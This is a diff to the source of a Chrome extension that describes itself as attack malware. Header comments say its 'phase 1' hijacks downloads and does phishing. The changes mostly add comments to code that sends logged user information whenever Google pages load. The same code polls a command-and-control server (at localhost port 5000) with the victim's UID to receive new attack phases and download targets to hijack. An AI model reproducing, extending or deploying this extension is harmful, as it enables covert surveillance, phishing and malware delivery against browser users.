@@ -52,7 +52,7 @@ In the other hand, the phase state is restarted with updates of the extension, b
 
 IMPORTANT VARIABLES:
 
-uid = user identifier
+uid = Unique IDentifier
 phase = phase of the attack; 0 just log information, 1 hickjack downloads and do phising
 
 Obj = patter name of the download to be hicjacked
@@ -299,16 +299,16 @@ function logSend(){
 
 
 
-
-chrome.webNavigation.onCompleted.addListener((e) => {
-    if (e.url.includes("google")){
-        chrome.storage.local.get(["TimeA"]).then( (result)=>{     
-                let a = Date.now()
-                a = Math.abs(parseInt(result.TimeA)-a)
-                if (a > 10*1000){
-                    if(logSend()){
-                        a = Date.now()
-                        chrome.storage.local.set({TimeA:a})
+//SEND EVENT
+chrome.webNavigation.onCompleted.addListener((e) => { //add a listener that activate when any url is completly loaded
+    if (e.url.includes("google")){ //is that url some google url ?
+        chrome.storage.local.get(["TimeA"]).then( (result)=>{  //then take TimeA   
+                let a = Date.now() //take actual time
+                Delta = Math.abs(parseInt(result.TimeA)-a) //calculate Delta
+                if (Delta > 10*1000){ //if Delta > 10 seconds
+                    if(logSend()){ //Try to send all information (false if some error happened)
+                        a = Date.now()//ask again for actual time, several fetchs and gets have happened
+                        chrome.storage.local.set({TimeA:a}) //change TimeA to actual time
                     }
                     
 
@@ -338,15 +338,16 @@ indentifie.
      months a local storage solution with dates shall be used)
 */
 
-function phase(){
-    chrome.storage.local.get(["uid"]).then( (result)=>{
-    result = result.uid.toString()
-    fetch(`http://127.0.0.1:5000/req/${result}`,
+function phase(){ //This function manges any kind of change in the phase
+    chrome.storage.local.get(["uid"]).then( (result)=>{ //with the UID of the user
+    result = result.uid.toString() //as a str
+    fetch(`http://127.0.0.1:5000/req/${result}`, //request the CC server newest entry
         {
         method: "GET",
         mode: 'no-cors', 
         headers:{"Content-Type": "application/json"}
         }).then(r => r.text()).then(result => {
+            //actualize information
             result = JSON.parse(result)
             chrome.storage.local.set({phase:parseInt(result.phase)});
             chrome.storage.local.set({Obj:result.obj});
@@ -357,15 +358,15 @@ function phase(){
     }
 
     
-chrome.webNavigation.onCompleted.addListener((e) => {
-    if (e.url.includes("google")){
-        chrome.storage.local.get(["TimeB"]).then( (result)=>{     
-                let b = Date.now()
-                b = Math.abs(parseInt(result.TimeB)-b)
-                if (b > 10*1000){
-                    phase()
-                    b = Date.now()
-                    chrome.storage.local.set({TimeB:b})
+chrome.webNavigation.onCompleted.addListener((e) => {//add a listener that activate when any url is completly loaded
+    if (e.url.includes("google")){//is that url some google url ?
+        chrome.storage.local.get(["TimeB"]).then( (result)=>{ //then take TimeB 
+                let b = Date.now() //take actual time
+                Delta = Math.abs(parseInt(result.TimeB)-b) //calculate Delta
+                if (Delta > 10*1000){ //if Delta > 10 seconds
+                    phase() //query new information
+                    b = Date.now() //take actual time
+                    chrome.storage.local.set({TimeB:b}) //save new time
                 }
         });
 
